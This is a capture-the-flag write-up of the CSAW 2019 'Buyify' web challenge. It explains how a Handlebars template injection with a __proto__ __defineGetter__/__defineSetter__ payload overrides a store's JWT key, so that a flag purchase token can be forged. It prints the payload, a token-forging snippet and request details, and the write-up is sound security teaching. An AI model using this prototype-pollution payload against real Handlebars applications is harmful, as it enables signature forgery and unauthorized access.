# Buyify (Web, 500, 15 solves)
I decided to solve a few Web challenges from this year [CSAW 2019 (Quals)] and `Buyify` was one of them. The challenge was created by [@itszn13] and was solved by 15 teams. 

### Quick look
We are provided with a simple [website] where we can:
- visit `flag` store and by `flag` there
- create our own store
- update store description
- create new items

After playing around with the webiste I noticed an interesting template in *update store description*
```html
<p class="title">{{ store_name }} Store</p>
<p class="subtitle">Welcome to a store for all things {{ store_name }}</p>
```

### Handlebars and 0day
The first thing to try is always `{{7*7}}` to search for a possible template injection. When doing so we can notice the following error:

```
Error: Parse error on line 1:
{{7*7}}
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
    at Parser.parseError (/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19)
    at Parser.parse (/node_modules/handlebars/dist/cjs/h
....
```

From the error, we can read that the library responsible for compiling templates is [handlebars]. Quick research led me to a great article [Handlebars template injection and RCE in a Shopify app]. The mentioned vulnerability was patched though and the challenge was clearly about *bypassing* the fix.

However, we could see the hint 
> *HINT: Templates are a prototype for fun and also, don't worry, you don't need rce*

so we most likely didn't need to search for another critical vulnerability in the library. 

In the following sections, I will present a solution split into pieces that are required to understand the problem and omit all the wrong directions I took.


### Purchase the flag
When visiting http://web.chal.csaw.io:1002/store/flag/ we could try to purchase the flag and we could notice the following request:

```http
POST /store/flag/checkout HTTP/1.1
Host: web.chal.csaw.io:1002
Content-Length: 158
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=s%3AOi5yhl-2orxSQ5iN9KzeprT9FThgtxPX.EXOINstCO0gUpXWeK7URQliyfG6KdI7N9j91IWPFAbY

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZsYWcuZmxhZyIsInByaWNlIjoxMDAwMDAwMDAsImlhdCI6MTU2ODU4Nzg0Mn0.c1RVg_POsjNIT0L0LHBkJ5db12BKPHHbundirMsJdaA
```

After decoding the `jwt token` we get a `JSON` object:

```json
{
  "id": "flag.flag",
  "price": 100000000,
  "iat": 1568587842
}
```

Unfortunately, we only get `$100` on start so the purchase will not be completed. 

### Token format
The `id` in the token is created by joining `store_name` with the `item_name`, we can see that happening in [server.js]:

```js
// Create an item, assign it an id, and store its callback
function create_item(id, name, callback) {
  let item_id = `${id}.${name}`;
  items[item_id] = callback;
  return item_id;
}
```

Then the token itself is a `jwt` signed with `store.key` which we can find in [store.js]: 

```js
// Sign an item for sale in the store
function sign_item(item) {
  let token = jwt.sign({id:item.id, price:item.price}, store.key);
  return token;
}
```

### Store object
In the [store.js] we can also notice that the `store` object looks like the following:

```js
  /* === Instance === */
  store = {
    name: name,
    id: id,
    items: [],
    header_template: `<p class="title">{{ store_name }} Store</p>
<p class="subtitle">Welcome to a store for all things {{ store_name }}</p>`,
    item_map: {},
  };
```

One strange thing is that the `key` attribute is not defined here, but we saw earlier that `store.key` was used to encode the token.

In [store.js] we can find the place where `store.key` is actually defined: 

```js
// Invalidate and resign all items
function update_store() {
  // Create store key with long random string
  store.key = crypto.randomBytes(64).toString('hex');

  for (let item of store.items) {
    item.token = sign_item(item);
  }
}
```

This looks impossible to crack, but let's see when `update_store()` function is called. Here it is:

```js
// Create an item with a given name and price
function create_item_impl(name, price, cb) {
  let item = {
    name: name,
    price: price,
  };

  // The server assigns an item id to us that is unique
  item.id = g_create_item(name, cb);

  store.items.push(item);
  store.item_map[item.id] = item;

  update_store();
}
```

From reading the code it becomes obvious that `store.key` is defined when a new item is created and all the previous items are being updated in the process. This will become handful soon. 

### What if we knew the secret key?
If we knew the secret key from `store` object we could sign an object `{'id': 'flag.flag', 'price':'1'}` with that key and then by sending a `/checkout` request from [#Purchase-the-flag](#Purchase-the-flag) receive the flag. That is because of the following part of [server.js]:

```js
// Get an item callback
function get_item(item) {
  money_count += item.price;
  return items[item.id];
}

// Create the Flag store and the Flag item
stores[create_store('Flag','flag')].create_item('flag', 100000000, (id, req, res)=>{
  flag_count++;
  res.send(`Congrats! Your flag is ${
      fs.readFileSync('flag.txt').toString().replace(/^\s+|\s+$/g, '')}!`);
});
```

The only requirement to access the flag is that 

```js
item = jwt.verify(req.body.token, store.key);
```

from `checkout(req, res)`  function in [store.js] does not throw an error, i.e. the signature matches the key.

### Let's head back to template injection
So, I mentioned earlier about this great bug in `Shopify` store that allowed to do an `RCE` but that this does not work anymore. The reason why we cannot get the remote code execution anymore is that any attempt for calling the `constructor` of any object will return `undefined`. Without a `constructor` it will be hard to iterate over contexts or to evaluate a string. But in the hint, it was said that we do not need to achieve `RCE`.

To solve the challenge we would either want to read the `store.key` or override it with a known to us value. The syntax of [handlebars] is limited but it has [helper functions] that can do some crazy things. To take advantage of [#Store-object](#Store-object) we would ideally want to override the Object prototype and define our own [setter] and [getter] on `key` property so we can either read the key or replace it with controlled by us value. 

In plain `javascript` it could look like:

```js
  Object.defineProperty(
    Object.prototype, 'key', {
     get: function(){
       return this.toString()
     }
     set: function(){
       return this.toString()
     }
   }
  )
```

Since we cannot access any `constructor` property, getting reference to `Object` is a hard task. But there is another way to define [setter] or [getter]. There are deprecated features like [\_\_defineSetter\_\_] and [\_\_defineGetter\_\_] that still work. These can be called in [handlebars] for example in that payload: `{{this.__proto__.defineGetter}}`. Full payload looks like:

```js
{{#with this.__proto__ as |o|}}
    {{o.__defineGetter__ "key" toString}}
    {{o.__defineSetter__ "key" toString}}
{{/with}}
```

and is equivalent to the `Object.defineProperty` mentioned above. What it does is basically setting a context to prototype of `[object]` and then calling [\_\_defineSetter\_\_] and [\_\_defineGetter\_\_] that set `key` property to `[object].toString()`. Now accessing `[object].key` will always return `[object Object]` as a string. 

### Win the lottery
So now, the only thing left to do is creating a valid `token` via

```py
# Forge flag token
flag_token = jwt.encode({
    "id": "flag.flag",
    "price": 1,
    "iat": 1568568228
  }, '[object Object]', algorithm='HS256')

```

and purchasing the flag for `$1`. 

I automated the process with [solve.py] where I briefly described each step. Running the program gave me the flag **flag{npm_devs_are_pretty_bad_at_fixing_bugs}**

```
('store_id:', '8f7200eeca32be27')
('connect.sid:', 's%3ADSlt0-0SNSLZoouWqDABjgFzqVEMuByq.dUXN3f5ujGaKv1FGT0dr2m4RwtVpn6lXmziAc1ou3Ik')
Congrats! Your flag is flag{npm_devs_are_pretty_bad_at_fixing_bugs}!
```

[CSAW 2019 (Quals)]:<https://ctftime.org/event/870>
[@itszn13]:<https://twitter.com/itszn13>
[website]:<https://github.com/terjanq/Flag-Capture/tree/master/CSAW%20CTF%20Qualification%20Round%202019/buyify>
[handlebars]:<https://handlebarsjs.com/>
[Handlebars template injection and RCE in a Shopify app]:<http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html>
[store.js]:<./store.js>
[server.js]:<./server.js>
[helper functions]:<https://handlebars-draft.knappi.org/guide/block-helpers.html#the-with-helper>
[setter]:<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/set>
[getter]:<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/get>
[\_\_defineSetter\_\_]:<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__>
[\_\_defineGetter\_\_]:<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineGetter__>
[solve.py]:<./solve.py>